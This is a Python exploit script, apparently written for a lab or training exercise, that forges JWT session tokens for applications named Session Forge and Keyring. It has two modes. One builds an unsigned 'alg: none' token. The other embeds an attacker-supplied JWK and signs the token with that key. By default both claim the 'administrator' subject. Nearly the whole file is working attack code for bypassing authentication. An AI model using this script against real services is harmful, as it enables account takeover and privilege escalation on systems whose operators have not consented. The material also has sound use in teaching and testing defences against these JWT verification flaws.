#!/usr/bin/env python3
"""
Session token forgery for the Session Forge and Keyring applications.

Two modes, one per defect.

  --alg none   Set the header algorithm to "none" and drop the signature.
               Exploits a server that dispatches verification on the
               algorithm named inside the token.

  --jwk        Embed a JWK in the header and sign with the key material it
               carries. Exploits a server that verifies a token with a key the
               token itself supplies.

Neither mode needs anything but Python. The signature is HMAC-SHA256 over the
ASCII bytes of "header.payload", as RFC 7515 specifies, and each segment is
base64url encoded without padding.

That the "none" mode needs no cryptography is the point: an empty signature
over an unverified token is indistinguishable from a genuine one to a server
that skipped the check.
"""

import argparse
import base64
import hashlib
import hmac
import json
import time


def b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def decode_part(segment: str) -> str:
    return base64.urlsafe_b64decode(segment + "=" * (-len(segment) % 4)).decode("utf-8", "replace")


def show(label: str, token: str) -> None:
    parts = token.split(".")
    print(f"  {label}")
    print(f"    header    {decode_part(parts[0])}")
    print(f"    payload   {decode_part(parts[1])}")
    signature = parts[2] if len(parts) > 2 else ""
    print(f"    signature {'<empty>' if signature == '' else signature[:32] + '...'}")


def build(header: dict, claims: dict, signing_key: bytes | None) -> str:
    header.setdefault("typ", "JWT")
    now = int(time.time())
    payload = {"iss": "northwind.supply", "iat": now, "exp": now + 3600, **claims}

    signing_input = ".".join(
        b64url(json.dumps(part, separators=(",", ":")).encode()) for part in (header, payload)
    )

    if signing_key is None:
        return f"{signing_input}."

    signature = hmac.new(signing_key, signing_input.encode(), hashlib.sha256).digest()
    return f"{signing_input}.{b64url(signature)}"


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--alg", choices=["none"], help="forge an unsigned token")
    parser.add_argument("--jwk", metavar="KEY", help="embed a JWK holding this symmetric key")
    parser.add_argument("--sub", default="administrator")
    parser.add_argument("--original", help="a genuine token, shown for comparison")
    args = parser.parse_args()

    if args.original:
        show("genuine token (server-issued)", args.original)

    if args.alg == "none":
        token = build({"alg": "none"}, {"sub": args.sub}, None)
        show("forged token (unsigned)", token)
    elif args.jwk is not None:
        key = args.jwk.encode()
        header = {"alg": "HS256", "jwk": {"kty": "oct", "kid": "attacker", "k": args.jwk}}
        token = build(header, {"sub": args.sub}, key)
        show("forged token (embedded JWK)", token)
    else:
        parser.error("choose --alg none or --jwk KEY")

    print(f"\n{token}")


if __name__ == "__main__":
    main()